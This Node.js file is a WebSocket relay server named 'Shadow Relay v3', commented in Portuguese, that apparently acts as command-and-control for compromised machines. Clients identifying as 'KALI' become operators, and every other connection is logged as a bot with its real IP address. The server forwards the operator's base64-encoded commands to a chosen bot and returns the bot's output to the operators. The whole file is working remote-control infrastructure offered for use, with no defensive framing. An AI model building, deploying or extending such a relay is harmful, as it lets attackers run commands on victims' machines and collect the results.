const WebSocket = require('ws');
const http = require('http');

const PORT = process.env.PORT || 10000;
const server = http.createServer((_, r) => r.end('Shadow Relay v3 High-Stability'));
const wss = new WebSocket.Server({ server });

const OPERADORES = new Set();
const BOTS = new Map();

wss.on('connection', (ws, req) => {
    // Captura o IP real (considerando se estiver atrás de um proxy como o Render)
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const params = new URLSearchParams(req.url.split('?')[1]);
    const who = params.get('id');

    if (!who) return ws.close();

    if (who === 'KALI') {
        OPERADORES.add(ws);
        BOTS.forEach((info, id) => {
            ws.send(JSON.stringify({ t: 'bot', s: 'on', id: id, ip: info.ip }));
        });
    } else {
        // Armazena o socket e o IP do alvo
        BOTS.set(who, { socket: ws, ip: ip });
        const msg = JSON.stringify({ t: 'bot', s: 'on', id: who, ip: ip });
        OPERADORES.forEach(op => { if (op.readyState === WebSocket.OPEN) op.send(msg); });
    }

    ws.on('message', (data) => {
        try {
            const j = JSON.parse(data);
            if (OPERADORES.has(ws)) {
                // KALI mandando para o BOT
                const target = BOTS.get(j.to);
                if (target && target.socket.readyState === WebSocket.OPEN) {
                    target.socket.send(j.cmd); // Envia o comando (que já deve vir em B64 do Kali)
                }
            } else {
                // BOT mandando resposta para o KALI
                const msg = JSON.stringify({ t: 'res', f: who, d: j.out });
                OPERADORES.forEach(op => { if (op.readyState === WebSocket.OPEN) op.send(msg); });
            }
        } catch (e) { }
    });

    ws.on('close', () => {
        if (OPERADORES.has(ws)) {
            OPERADORES.delete(ws);
        } else {
            BOTS.delete(who);
            const msg = JSON.stringify({ t: 'bot', s: 'off', id: who });
            OPERADORES.forEach(op => { if (op.readyState === WebSocket.OPEN) op.send(msg); });
        }
    });
});

server.listen(PORT);
